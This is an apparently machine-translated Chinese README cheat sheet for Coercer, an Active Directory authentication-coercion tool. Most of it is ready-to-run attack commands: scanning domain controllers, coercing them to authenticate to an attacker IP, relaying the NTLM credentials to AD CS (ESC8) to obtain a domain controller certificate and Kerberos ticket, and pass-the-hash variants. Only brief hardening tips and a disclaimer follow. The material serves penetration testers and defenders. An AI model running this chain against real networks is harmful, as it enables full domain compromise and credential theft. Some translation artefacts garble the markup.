<!-- language-home-navigation -->
[🏠 中文主页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🪓 Coercer - 完整备忘单

[🇹🇷 Türkçe Sürüm]（翻译/README.tr.md）
```
   ██████╗ ██████╗ ███████╗██████╗  ██████╗███████╗██████╗ 
  ██╔════╝██╔═══██╗██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗
  ██║     ██║   ██║█████╗  ██████╔╝██║     █████╗  ██████╔╝
  ██║     ██║   ██║██╔══╝  ██╔══██╗██║     ██╔══╝  ██╔══██╗
  ╚██████╗╚██████╔╝███████╗██║  ██║╚██████╗███████╗██║  ██║
   ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝  ╚═╝
       Active Directory Multi-Protocol Windows Authentication Coercion Engine
```
<p对齐=“中心”>
  <img src="https://img.shields.io/badge/Coercer-RPC_Coercion-blue?style=for-the-badge" alt="Coercer">
  <img src="https://img.shields.io/badge/Author-p0dalirius-orange?style=for-the-badge" alt="p0dalirius">
  <img src="https://img.shields.io/badge/Category-Active_Directory_&_Network-green?style=for-the-badge" alt="Active Directory">
  <img src="https://img.shields.io/badge/License-GPLv3-red?style=for-the-badge" alt="许可证 GPLv3">
</p>

<p对齐=“中心”>
  <b>🌐自动扫描、检测并强制 Windows 服务器和域控制器通过 12+ RPC 协议向任意计算机进行身份验证</b>
</p>

---

## 📋 目录

- [概述和身份验证强制原语](#-overview--the-authentication-coercion-primitive)
- [支持的 RPC 协议和方法](#-supported-rpc-protocols--methods)
- [安装](#-安装)
- [扫描存在漏洞的 RPC 接口 (`scan`)](#-scanning-for-vulnerable-rpc-interfaces-scan)
- [执行身份验证强制 (`coerce`)](#-executing-authentication-coercion-coerce)
- [完整攻击链：强制 -> NTLM 中继 -> AD CS ESC8](#-the-full-attack-chain-coercion---ntlm-relay---ad-cs-esc8)
- [协议和方法过滤](#-protocol--method-filtering)
- [Kerberos 和传递哈希支持](#-kerberos--pass-the-hash-support)
- [快速参考表](#-quick-reference-table)
- [防御考虑和强化](#-defective-considerations--hardening)
- [法律免责声明](#-legal-disclaimer)

---

## 🎯 概述和身份验证强制原语

在 Active Directory 环境中，**身份验证强制**是一种毁灭性的攻击性原语。它利用 Windows 服务中实现的传统 RPC 接口，允许经过身份验证的用户要求远程计算机（如域控制器）连接到指定的 UNC 路径 (`\\attacker\share`)。

当远程 Windows 计算机连接到攻击者控制的计算机时，它会启动**计算机帐户 NTLM 身份验证** (`DC01$`)。 

通过使用 `ntlmrelayx` 捕获或转发此计算机帐户凭据到 Active Directory 证书服务（AD CS Web 注册 - ESC8）或不受约束的委派目标，攻击者可以实现**立即完全域入侵**。

**Coercer** 由 **Clément Notin (p0dalirius)** 创作，将十多个单独的强制利用（PetitPotam、PrinterBug、ShadowCoerce、DFSCoerce）统一到一个自动化、高度模块化的框架中。

---

## 🔌 支持的 RPC 协议和方法

Coercer 测试并利用以下 RPC 接口：

|协议名称|常见漏洞名称 |管道/接口|
|----------------|--------------------------------|--------------------|
| **MS-EFSRPC** |小波坦 | `\pipe\efsrpc`、`\pipe\lsarpc` |
| **MS-RPRN** | PrinterBug / SpoolSample | 打印机错误`\pipe\spoolss` |
| **MS-FSRVP** |暗影威力 | `\pipe\FSRVP` |
| **MS-DFSNM** | DFS强制| `\pipe\netdfs` |
| **MS-PAN** | PrintNightmare 相邻 |远程打印管理|
| **MS-SAMR** |奶酪 |安全客户经理 |

---

## 📥 安装
```bash
# Install via pipx (Recommended)
pipx install coercer

# Or via standard pip
pip3 install coercer

# From GitHub source
git clone https://github.com/p0dalirius/Coercer.git
cd Coercer
pip3 install -r requirements.txt
python3 Coercer.py --help
```
---

## 🔍 扫描易受攻击的 RPC 接口 (`scan`)

在触发强制之前，请安全扫描目标域控制器以发现哪些 RPC 功能已启用且可访问：
```bash
# Scan a single Domain Controller
coercer scan -u 'testuser' -p 'Password123' -d 'corp.local' -t 10.10.10.1

# Scan an entire range of Domain Controllers
coercer scan -u 'testuser' -p 'Password123' -d 'corp.local' --targets-file dcs.txt
```
---

## ⚡ 执行身份验证强制 (`coerce`)

触发从目标 DC 到侦听器的出站计算机帐户 NTLM 连接：
```bash
# Coerce DC (10.10.10.1) to authenticate to attacker machine (10.10.14.5)
coercer coerce -u 'testuser' -p 'Password123' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5
```
---

## 💥 完整攻击链：强制 -> NTLM 中继 -> AD CS ESC8

规范域升级向量：
```bash
# 1. Start ntlmrelayx targeting the vulnerable AD CS Web Enrollment HTTP endpoint
impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# 2. Trigger authentication coercion using Coercer
coercer coerce -u 'lowuser' -p 'Pass123' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5

# 3. ntlmrelayx receives DC01$ authentication and generates a base64 certificate!

# 4. Request a full Domain Admin Kerberos TGT using gettgtpkinit (PKINITtools)
gettgtpkinit.py corp.local/DC01\$ -pfx-base64 <BASE64_CERT> dc01.ccache
```
---

## 🎯 协议和方法过滤

针对特定方法而不向整个 RPC 频谱发送垃圾邮件：
```bash
# Coerce using ONLY PetitPotam (MS-EFSRPC)
coercer coerce -u 'user' -p 'pass' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5 --filter-protocol-name MS-EFSRPC

# Coerce using ONLY PrinterBug (MS-RPRN)
coercer coerce -u 'user' -p 'pass' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5 --filter-protocol-name MS-RPRN
```
---

## 🔑 Kerberos 和哈希传递支持
```bash
# Authenticate using NTLM Hash (Pass-the-Hash)
coercer coerce -u 'user' --hashes :aad3b435b51404eeaad3b435b51404ee:7fc508... -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5

# Authenticate using Kerberos Ticket (KRB5CCNAME)
export KRB5CCNAME=/tmp/user.ccache
coercer coerce -k -no-pass -d 'corp.local' -t dc01.corp.local -l 10.10.14.5
```
---

## ⚡ 快速参考表

|目标|命令 |
|------------|---------|
| **扫描 DC 进行强制** | `coercer scan -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP>` |
| **强制身份验证** | `coercer coerce -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP> -l <ATTACKER_IP>` |
| **通过 MS-EFSRPC 强制** | `coercer coerce -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP> -l <IP> --filter-protocol-name MS-EFSRPC` |
| **通过 MS-RPRN 强制** | `coercer coerce -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP> -l <IP> --filter-protocol-name MS-RPRN` |
| **传递哈希强制** | `coercer coerce -u <USER> --hashes :<NTLM> -d <DOMAIN> -t <DC_IP> -l <IP>` |
| **Kerberos 票证强制** | `coercer coerce -k -no-pass -d <DOMAIN> -t <DC_FQDN> -l <IP>` |

---

## 🛡️ 防守考虑和强化

1. **在 DC 上禁用打印后台处理程序：** 应在域控制器 (`Stop-Service Spooler -Passthru; Set-Service Spooler -StartupType Disabled`) 上完全禁用打印后台处理程序服务 (`spoolsv.exe`)。
2. **启用身份验证扩展保护 (EPA)：** 在 AD CS IIS 服务器上，启用 EPA 并要求 HTTPS 以阻止 NTLM 中继攻击。
3. **RPC 过滤和网络分段：** 将 RPC 端点映射器访问（TCP 端口 135）限制为授权管理子网。

---

## ⚠️ 法律免责声明

> [!警告]
> Coercer 会触发主动远程身份验证调用，从而破坏未打补丁的域服务的稳定性。仅在授权渗透测试期间并在客户明确同意的情况下使用。